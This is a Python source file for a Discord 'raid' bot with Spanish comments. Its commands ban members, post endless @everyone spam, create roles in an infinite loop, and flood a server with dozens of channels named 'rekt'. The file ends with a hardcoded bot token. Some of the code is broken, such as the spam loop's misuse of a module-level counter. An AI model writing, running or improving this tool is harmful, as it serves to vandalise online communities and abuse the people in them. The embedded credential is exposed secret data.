
from asyncore import loop
import discord
from discord.ext.commands import *
from discord.ext import commands
import random
import asyncio
import time
import json
from itertools import cycle
import time
from threading import Thread
from random import randint
import datetime
import os
import aiohttp
import sys
import traceback
import json
from discord.utils import get

 
##Prefix del bot##

bot = commands.Bot(command_prefix='!')

client = commands.Bot(command_prefix='!')

##otros##
bot.remove_command('help')



##El bot esta listo##
@bot.event
async def on_ready():
#BOT STATUS#
    print("El bot se encuentra online, a spamear :)")
    print(f"Status del bot: Online...")



##BAN A TODOS##
@bot.command(pass_context=True)
async def ban(ctx, member : discord.Member):
    await member.ban()
    await ctx.message.delete()

 
##Comando para spamear##
mensaje=0
    
@bot.command(pass_context=True)
async def spam(ctx): #escribir "spam" para ejecutar el comando
    await ctx.message.delete()
    while True:
        while mensaje < 500:
         await ctx.send(
            "@Everyone Mensaje de raid")
         mensaje = mensaje+1
       


##Spamear Roles##
@bot.command(pass_context=True)
async def roles(ctx):
    await ctx.message.delete()
    while True:
        guild = ctx.guild
        await guild.create_role(name="2 ez") 
        await guild.create_role(name="get clapped") 





##Crear canales##
@bot.command(pass_context=True)
async def channels(ctx):
    await ctx.message.delete()
    guild = ctx.message.guild
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')
    await guild.create_text_channel('rekt')







##Token del bot##
bot.run ("ODUzMDcyMjY1MzE4ODkxNTQw.GZuOtp.ThgSC4byuOiz1sl7o5dqJHSAxGaDMorTK5bDR4")
